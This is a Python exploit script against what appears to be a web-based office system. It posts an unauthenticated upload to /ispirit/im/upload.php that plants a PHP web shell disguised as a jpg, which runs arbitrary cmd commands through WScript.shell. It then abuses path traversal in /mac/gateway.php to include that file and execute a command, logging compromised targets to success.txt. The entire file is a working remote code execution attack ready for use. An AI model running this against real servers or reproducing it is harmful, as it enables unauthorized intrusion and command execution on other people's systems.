# -*- coding: utf-8 -*-
import requests, re, sys
def check(url):
    try:
        url1 = url + '/ispirit/im/upload.php'
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36",
            "Cache-Control": "no-cache",
            "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB",
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate","Accept-Language": "zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5",
            "Connection": "close"}
        cookies = {'PHPSESSID':'123'}
        data = "------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"UPLOAD_MODE\"\r\n\r\n2\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"P\"\r\n\r\n123\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"DEST_UID\"\r\n\r\n1\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB\r\nContent-Disposition: form-data; name=\"ATTACHMENT\"; filename=\"jpg\"\r\nContent-Type: image/jpeg\r\n\r\n<?php\r\n$command=$_POST['cmd'];\r\n$wsh = new COM('WScript.shell');\r\n$exec = $wsh->exec(\"cmd /c \".$command);\r\n$stdout = $exec->StdOut();\r\n$stroutput = $stdout->ReadAll();\r\necho $stroutput;\r\n?>\r\n------WebKitFormBoundarypyfBh1YB4pV8McGB--\r\n"
        try:
            result = requests.post(url1, headers=headers, data=data, cookies=cookies, timeout=5)
        except :
            return
        name = "".join(re.findall("2003_(.+?)\|", result.text))
        if result.status_code == 200:
            return name
        else:
            return False
    except:
        pass
def command(url1, name, command="whoami"):
    url = url1 + '/mac/gateway.php'
    headers = {
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    cookies = {'PHPSESSID': '123'}
    data = 'json={"url":"/general/../../attach/im/2003/%s.jpg"}&cmd=%s\r\n' % (name,command)
    try:
        result = requests.post(url, headers=headers, data=data, cookies=cookies, timeout=5)
    except:
        return
    if(not 'specified' in result.text):
        print("cmd->%s" % command)
        print(result.text)
        with open('success.txt', 'a', encoding='utf-8') as f:
            f.write(url1.strip() + '\t' + name.strip() + '\t' + result.text.strip() + '\n')
if __name__ == '__main__':
    url = sys.argv[1]
    name = check(url)
    if name:
        print(name)
        print("[+] Remote code execution vulnerability exists at the target address")
        command(url, name)
    else:
        print("[-] There is no remote code execution vulnerability in the target address")
